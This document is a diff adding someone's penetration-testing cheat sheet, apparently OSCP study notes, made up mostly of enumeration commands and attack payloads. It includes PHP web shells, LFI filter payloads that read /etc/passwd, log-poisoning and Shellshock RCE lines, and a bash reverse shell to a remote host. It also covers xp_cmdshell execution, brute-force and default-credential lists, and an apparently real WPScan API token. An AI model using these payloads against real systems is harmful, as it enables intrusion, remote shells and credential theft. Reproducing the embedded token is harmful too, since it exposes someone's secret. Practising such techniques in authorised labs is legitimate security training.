@@ -1,0 +1,192 @@
+Service Enumerations (auxillary scanner)
+++++++++++++++++++++++++++++++++++++++++
+
+
+Samba (139/445)  - most imp find the version
+==================================
+rpcclient -u "" 192.168.100.9
+ srvinfo, enumdomusers, getdompwinfo
+ https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
+eunm4linux ---> best tool to enumerate the users
+smb_enumusers  --> to get the list of users available in the sytem
+smb_enumshares ---> list of share avalible in system to place exploit
+smb_version    ---> version for public exploit
+psexec_loggedin_users  ---> loged in user for priv esc
+
+nmap -sT -A --script=smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse --script-args=unsafe=1 10.11.1.5
+
+create users as pass to bruteforce
+
+nbtscan -r host
+
+https://forums.offensive-security.com/showthread.php?26657-enum4linux-and-smbclient-fix-for-quot-protocol-negotiation-failed-NT_STATUS_CONNECTION_DISCONNECTED-quot&highlight=version
+
+NFS Enumerations
+============================================
+nmap --script nfs* hostname
+   mount -o nilock 192.168.100.50:/home /root/share/
+   useradd -u 2008 vulnix
+
+SNMP (161 udp) - see VR vedios
+===========================================
+onesixytone
+onesixytone -c file -i ip
+SNMPwalk
+snmpwalk -c public -v1 -t 10 host - > enum MIB tree
+snmpwalk -c public -v1 host mib value -> enum windows users
+snmpwalk -c public -v1 host mib value -> enum process also 
+snmpwalk -c public -v1 host mib value -> enum open TCP port also
+snmpwalk -c public -v1 host mib value -> enum installed software
+
+buruteforce all mib value with the -> snmpwalk -c public -v1 host $mibval
+
+FTP (21) 
+========
+anonymous 
+easy_file_sharing_ftp (anonymous login sucess) 
+ftp_login --->   bruteforce
+
+SMTP (25)  
+=========
+nc -nv 192.168.100.9 25
+ VRFY user
+for user in $(cat users);do echo VRFY $user | nc inv 192.168.100.9 25 2>/dev/null | grep ^"2250";done
+smtp_enum  -> info about SMTP
+smtp_verion
+smtp_relay  
+
+
+TELNET (23)
+===========
+login  -> login bruteforce
+
+
+Mysql
+=====
+writeable_dir
+login     -->    login bruteforce
+
+
+
+MSSQL 1433
+===========
+https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#mssqlclient-py
+
+DNS (53)
+========
+nslookup -> server <ip>
+dig axfr @ip <hostname>
+
+host megacorpone.com
+host -t mx megacorpone.com 
+host -t ns megacorpone.com
+host -l megacorpone.com ns.megacorpone.com
+
+DNSrecon -d megacorpone.com -t axfr
+dnsenum megacorpone.com
+
+Ad (389/636)
+=============
+ldapsearch -LLL -x -H ldap://master.thinc.local -b '' -s base '(objectclass=*)'
+Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='thinc.local',userdb=/root/Desktop/usernames.txt <IP>
+smbmap -d 'thinc.local' -H ip
+
+LFI
+====
+-> use bash reverse shell 
+-> log possioning
+-> upload the shell file and acess it
+-> if no upload then search for the location of below
+		Look for db config files
+		Look for passwd config files
+->RCE via Apache log poisonning
+	/var/log/apache2/access.log
+->RCE via /proc/self/environ
+
+--------------------> Shell <----------------------------	
+<?php $command=$_GET["x"];echo shell_exec($command);?>
+<?php system($_GET['cmd']);?>
+--------------------> Shell <----------------------------
+
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php	Look for backup files
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+
+ref: https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
+
+
+	
+80/443
+=======
+-> look for product installation, manual guide for the default admin crdits (OSCP macchine will be dafult )
+look for /cgi-bin/ --> search for vulnerability shellshock ... 
+   curl  server/cgi-bin/index.bash -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+   /bin/bash -i > /dev/tcp/192.168.100.50/1234 0<&1 2>&1
+ 
+ add the dns entry
+ -> Sometimes they applicaiton must a vanila --> configure it get the shell - Bcz your admin ...
+ -> Try Basic SQLI 
+ 
+ 
+wpscan-  https://www.cyberpunk.rs/wpscan-usage-example
+ $ wpscan --disable-tls-checks --url http://playground.cyberpunk.rs:81/ --enumerate vp --plugins-detection aggressive --api-token rZmA9zz4pnq61d5fYakGbKTiUObEd0DHJwSvX67I07U
+ 
+ -> To get valid usernames
+ wpscan --disable-tls-checks --url https://10.10.159.57/ –-enumerate u --api-token rZmA9zz4pnq61d5fYakGbKTiUObEd0DHJwSvX67I07U
+ 
+ -> To get Valid password
+ wpscan --disable-tls-checks --url http://10.11.1.234/wp-login.php -P /usr/share/wordlists/rockyou.txt --usernames admin –max-threads 50
+ 
+ https://www.hackingarticles.in/wordpress-reverse-shell/
+
+ WP_dashboard->Apparence->select theme (at right corner)->Edit->404.php
+  http://192.168.1.101/wordpress/wp-content/themes/<themename>/404.php
+ 
+ - search for plugins-detection
+ - search for changelogs -- to trick they might change the version
+ - LFI/RFI & file upload & file edit in 404.php will be the most vule
+ - RCE
+
+ .action page finds search for apache struts-pwn  
+   https://github.com/mazen160/struts-pwn
+   
+80/443 - Manual
+----------------
+1. If no exploits found try configure the web site for file upload.
+2. Look for scchdule task to donwload the shell file - indentify the proper location.
+    C:\Inetput\wwwroot\
+	/var/www/html/ 
+3. Setting page for profile image upload.
+4. Look for RFI to download/save output in the www directory
+
+MS SQL
+----------------------------------
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="dir c:\\Users\\" 10.11.1.31
+
+Login Page
+-----------
+1. admin/admin
+2. admin/machine name
+3. admin/appname
+4. admin/123456
+5. admin/password123
+6. admin/amin@123
+7. admin/<any clue>
+8. admin/caps <machinename>
+9. admin/caps <app name>
+10. Admin/Admin
+11. admin/pass123
+12. admin/pass125
+13. admin/pass123
+14. admin/Pass125
+   
+Password hashes
+------------------------------------
+   
+
+
+
+
